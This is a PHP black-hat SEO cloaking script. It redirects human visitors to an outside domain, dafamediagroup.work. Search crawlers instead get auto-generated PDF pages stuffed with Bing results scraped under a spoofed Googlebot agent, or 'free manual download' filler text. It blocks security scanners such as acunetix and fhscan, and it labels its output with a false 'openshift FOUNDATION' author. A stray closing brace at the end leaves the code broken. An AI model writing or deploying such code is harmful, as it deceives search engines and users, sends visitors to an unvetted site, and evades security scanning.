<?php
error_reporting(0);
if(empty($_GET['title'])){
exit('EMPTY GET TITLE');
}

if(bad_bots()){
	exit();
}


if(!is_bot()){
		header("location: http://dafamediagroup.work/".$_GET['title'].".pdf");
		exit();
	}
	

	//CACHE
	if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE'])){
		header('HTTP/1.1 304 Not Modified');
        die();
	}
 header('Cache-control: max-age='.(60*60*24*30));
 header('Expires: '.gmdate(DATE_RFC1123,time()+60*60*24*30));
 header('Last-Modified: '.gmdate(DATE_RFC1123,time()));
 header('X-Robots-Tag: noarchive,notranslate,noodp', true);
	//END CACHE
	
	
$keyword = preg_replace('!([^a-zA-Z0-9\s]+)!i', ' ', $_GET['title']);
$keyword= trim($keyword);
$slug = preg_replace('!([^a-zA-Z0-9]+)!i', '-', $keyword);
$page_file_name= trim($slug,'-').'.pdf';



$page_title= ucwords($keyword);

$bing=IS_CURL(potong_kata($keyword));


$konten= '<b>'.strtoupper($page_title).'</b><br><br>';

 if($bing != null){
$konten .= $bing;
 }else{	
$konten= '<strong>'.$page_title.'</strong> instructions guide, service manual guide and maintenance manual guide on your products. 
Before by using this manual, service or maintenance guide you need to know detail regarding your products cause this manual for expert only. 
Produce your own . <strong>'.$page_title.'</strong> and yet another manual of these lists useful for your to mend,
fix and solve your products or services or device problems please do not try a mistake.
<br><br>
Do you need <i>'.$page_title.'</i>? Good news to understand that today <u>'.$page_title.'</u> can be acquired on the online library. 
With our online language learning resources, it will be possible to locate '.$page_title.' or just about any kind of manual, for any sort of product. 
Best of all, they are entirely free to get, use and download, so there is no cost or stress whatsoever.
<br><br>
<i>'.$page_title.'</i> might not make exciting reading, but <strong>'.$page_title.'</strong> comes complete with valuable specification, instructions, information and warnings.
We have got basic to find a instructions with no digging. 
And also by the ability to access our manual online or by storing it on your desktop, you have convenient answers with <u>'.$page_title.'</u>.
<br><br>
To download <i>'.$page_title.'</i>, you might be to certainly find our website that includes a comprehensive assortment of manuals listed. 
Our library will be the biggest of the which may have literally hundreds of a large number of different products represented. 
<br><br>
You\'ll see that you have specific sites catered to different product types or categories, brands or niches. 
So according to what exactly you happen to be searching, you will be able to choose user manuals and guides to match your own needs.';
 }
 

require('writehtmlclass.php');





	$pdf=new PDF_HTML('P', 'mm', 'A4');
	$pdf->SetAuthor('openshift FOUNDATION');
	$pdf->SetCreator('openshift FOUNDATION');
	$pdf->SetTitle($keyword);
	$pdf->SetSubject("Download Free ".$keyword);
	$pdf->SetFont('Times','',14);
	$pdf->AddPage();
	$htmla = $konten;
	if(ini_get('magic_quotes_gpc')=='1')
        $htmla=stripslashes($htmla);
    $pdf->WriteHTML($htmla);
	$pdf->Output($page_file_name, 'I');
	$pdf->Close();














function IS_CURL($keyword){   
	$protokol= protokol();
    $data = curl_init();
	$header[0] = "Accept: text/xml,application/xml,application/xhtml+xml,";
	$header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
	$header[] = "Cache-Control: max-age=0";
	$header[] = "Connection: keep-alive";
	$header[] = "Keep-Alive: 300";
	$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$header[] = "Accept-Language: en-us,en;q=0.5";
	$header[] = "Pragma: "; // browsers keep this blank.

     curl_setopt($data, CURLOPT_SSL_VERIFYHOST, FALSE);
     curl_setopt($data, CURLOPT_SSL_VERIFYPEER, FALSE);
     curl_setopt($data, CURLOPT_URL, 'http://www.bing.com:80/search?q='.urlencode($keyword).'&format=rss&count=50');
	 curl_setopt($data, CURLOPT_USERAGENT, 'Googlebot');
	 curl_setopt($data, CURLOPT_HTTPHEADER, $header);
	 curl_setopt($data, CURLOPT_REFERER, 'https://www.google.com');
	 curl_setopt($data, CURLOPT_ENCODING, 'gzip,deflate');
	 curl_setopt($data, CURLOPT_AUTOREFERER, true);
	 curl_setopt($data, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($data, CURLOPT_CONNECTTIMEOUT, 8);
	 curl_setopt($data, CURLOPT_TIMEOUT, 8);
	 curl_setopt($data, CURLOPT_MAXREDIRS, 2);

     $hasil = @simplexml_load_string(curl_exec($data));
     curl_close($data);	

	 if(empty($hasil)){
		 return null;
	 }

$has_arr= array();	 
foreach($hasil->channel->item as $item){
$clean_titleku= $item->title->__toString();
$jumjum_title= str_word_count($clean_titleku);
	if($jumjum_title > 3){
$ass= preg_replace("![^a-z0-9]+!i", " ", is_remove_tld($clean_titleku));
$ass= trim($ass, ' ');
$ass= strtolower($ass);
$desdes= $clean_titleku= $item->description->__toString();
$slugku= str_replace(' ', '-', $ass).'.pdf';
$isiku= '<a href="'.$protokol.$_SERVER['SERVER_NAME'].'/'.$slugku.'">'.$ass.'</a><br>'.$desdes.'<hr>';
$has_arr[]= $isiku;
}
}
$itemsku= implode('<br>', $has_arr);
return $itemsku;
}



function is_remove_tld($kl){
$rep = preg_replace('/(www\.|\.com|\.org|\.net|\.int|\.edu|\.gov|\.mil|\.ac|\.ad|\.ae|\.af|\.ag|\.ai|\.al|\.am|\.an|\.ao|\.aq|\.ar|\.as|\.at|\.au|\.aw|\.ax|\.az|\.ba|\.bb|\.bd|\.be|\.bf|\.bg|\.bh|\.bi|\.bj|\.bm|\.bn|\.bo|\.bq|\.br|\.bs|\.bt|\.bv|\.bw|\.by|\.bz|\.bzh|\.ca|\.cc|\.cd|\.cf|\.cg|\.ch|\.ci|\.ck|\.cl|\.cm|\.cn|\.co|\.cr|\.cs|\.cu|\.cv|\.cw|\.cx|\.cy|\.cz|\.dd|\.de|\.dj|\.dk|\.dm|\.do|\.dz|\.ec|\.ee|\.eg|\.eh|\.er|\.es|\.et|\.eu|\.fi|\.fj|\.fk|\.fm|\.fo|\.fr|\.ga|\.gb|\.gd|\.ge|\.gf|\.gg|\.gh|\.gi|\.gl|\.gm|\.gn|\.gp|\.gq|\.gr|\.gs|\.gt|\.gu|\.gw|\.gy|\.hk|\.hm|\.hn|\.hr|\.ht|\.hu|\.id|\.ie|\.il|\.im|\.in|\.io|\.iq|\.ir|\.is|\.it|\.je|\.jm|\.jo|\.jp|\.ke|\.kg|\.kh|\.ki|\.km|\.kn|\.kp|\.kr|\.krd|\.kw|\.ky|\.kz|\.la|\.lb|\.lc|\.li|\.lk|\.lr|\.ls|\.lt|\.lu|\.lv|\.ly|\.ma|\.mc|\.md|\.me|\.mg|\.mh|\.mk|\.ml|\.mm|\.mn|\.mo|\.mp|\.mq|\.mr|\.ms|\.mt|\.mu|\.mv|\.mw|\.mx|\.my|\.mz|\.na|\.nc|\.ne|\.nf|\.ng|\.ni|\.nl|\.no|\.np|\.nr|\.nu|\.nz|\.om|\.pa|\.pe|\.pf|\.pg|\.ph|\.pk|\.pl|\.pm|\.pn|\.pr|\.ps|\.pt|\.pw|\.py|\.qa|\.re|\.ro|\.rs|\.ru|\.rw|\.sa|\.sb|\.sc|\.sd|\.se|\.sg|\.sh|\.si|\.sj|\.sk|\.sl|\.sm|\.sn|\.so|\.sr|\.ss|\.st|\.su|\.sv|\.sx|\.sy|\.sz|\.tc|\.td|\.tf|\.tg|\.th|\.tj|\.tk|\.tl|\.tm|\.tn|\.to|\.tp|\.tr|\.tt|\.tv|\.tw|\.tz|\.ua|\.ug|\.uk|\.us|\.uy|\.uz|\.va|\.vc|\.ve|\.vg|\.vi|\.vn|\.vu|\.wf|\.ws|\.ye|\.yt|\.yu|\.za|\.zm|\.zr|\.zw|\.academy|\.accountants|\.active|\.actor|\.adult|\.aero|\.agency|\.airforce|\.app|\.archi|\.army|\.associates|\.attorney|\.auction|\.audio|\.autos|\.band|\.bar|\.bargains|\.beer|\.best|\.bid|\.bike|\.bio|\.biz|\.black|\.blackfriday|\.blog|\.blue|\.boo|\.boutique|\.build|\.builders|\.business|\.buzz|\.cab|\.camera|\.camp|\.cancerresearch|\.capital|\.cards|\.care|\.career|\.careers|\.cash|\.catering|\.center|\.ceo|\.channel|\.cheap|\.christmas|\.church|\.city|\.claims|\.cleaning|\.click|\.clinic|\.clothing|\.club|\.coach|\.codes|\.coffee|\.college|\.community|\.company|\.computer|\.condos|\.construction|\.consulting|\.contractors|\.cooking|\.cool|\.country|\.credit|\.creditcard|\.cricket|\.cruises|\.dad|\.dance|\.dating|\.day|\.deals|\.degree|\.delivery|\.democrat|\.dental|\.dentist|\.diamonds|\.diet|\.digital|\.direct|\.directory|\.discount|\.domains|\.eat|\.education|\.email|\.energy|\.engineer|\.engineering|\.equipment|\.esq|\.estate|\.events|\.exchange|\.expert|\.exposed|\.fail|\.farm|\.fashion|\.feedback|\.finance|\.financial|\.fish|\.fishing|\.fit|\.fitness|\.flights|\.florist|\.flowers|\.fly|\.foo|\.forsale|\.foundation|\.fund|\.furniture|\.gallery|\.garden|\.gift|\.gifts|\.gives|\.glass|\.global|\.gop|\.graphics|\.green|\.gripe|\.guide|\.guitars|\.guru|\.healthcare|\.help|\.here|\.hiphop|\.hiv|\.holdings|\.holiday|\.homes|\.horse|\.host|\.hosting|\.house|\.how|\.info|\.ing|\.ink|\.institute|\.insure|\.international|\.investments|\.jobs|\.kim|\.kitchen|\.land|\.lawyer|\.legal|\.lease|\.lgbt|\.life|\.lighting|\.limited|\.limo|\.link|\.loans|\.lotto|\.luxe|\.luxury|\.management|\.market|\.marketing|\.media|\.meet|\.meme|\.memorial|\.menu|\.mobi|\.moe|\.money|\.mortgage|\.motorcycles|\.mov|\.museum|\.name|\.navy|\.network|\.new|\.ngo|\.ninja|\.one|\.ong|\.onl|\.ooo|\.organic|\.partners|\.parts|\.party|\.pharmacy|\.photo|\.photography|\.photos|\.physio|\.pics|\.pictures|\.pink|\.pizza|\.place|\.plumbing|\.poker|\.porn|\.post|\.press|\.pro|\.productions|\.prof|\.properties|\.property|\.qpon|\.recipes|\.red|\.rehab|\.ren|\.rentals|\.repair|\.report|\.republican|\.rest|\.reviews|\.rich|\.rip|\.rocks|\.rodeo|\.rsvp|\.sale|\.science|\.services|\.sexy|\.shoes|\.singles|\.social|\.software|\.solar|\.solutions|\.space|\.supplies|\.supply|\.support|\.surf|\.surgery|\.systems|\.tattoo|\.tax|\.technology|\.tel|\.tips|\.tires|\.today|\.tools|\.top|\.town|\.toys|\.trade|\.training|\.travel|\.university|\.vacations|\.vet|\.video|\.villas|\.vision|\.vodka|\.vote|\.voting|\.voyage|\.wang|\.watch|\.webcam|\.website|\.wed|\.wedding|\.whoswho|\.wiki|\.work|\.works|\.world|\.wtf|\.xxx|\.xyz|\.yoga|\.zone)/i', '', $kl);
$rep = trim($rep, ' ');
return $rep;
}

 function potong_kata($s, $lenght=6) {
     $lenght= $lenght-1;
	 $count= str_word_count($s);
	  if($count > 10){
    return preg_replace('/((\w+\W*){'.$lenght.'}(\w+))(.*)/', '${1}', $s);    
	  }
	return $s;
}

function bad_bots(){
if(!isset($_SERVER['HTTP_USER_AGENT']) || empty($_SERVER['HTTP_USER_AGENT'])){
return true;
}
return preg_match('/(woobot|internetVista|openlinkprofiler|spbot|baidu|yandex|wget|curl|acunetix|fhscan)/i', $_SERVER['HTTP_USER_AGENT']);
}


function is_bot(){
	if(!isset($_SERVER['HTTP_USER_AGENT']) || empty($_SERVER['HTTP_USER_AGENT'])){
	return false;
	}
$patern= 'bot|google|media|yandex|bing|yahoo|msn|image|preview|partner|bingpreview|bingbot|msnbot';
return preg_match('/('.$patern.')/i', $_SERVER['HTTP_USER_AGENT']);
}

function protokol(){
	if (isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
    isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
    $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
  $protokol = 'https://';
}
else {
  $protokol = 'http://';
}
return $protokol;
}
}
?>
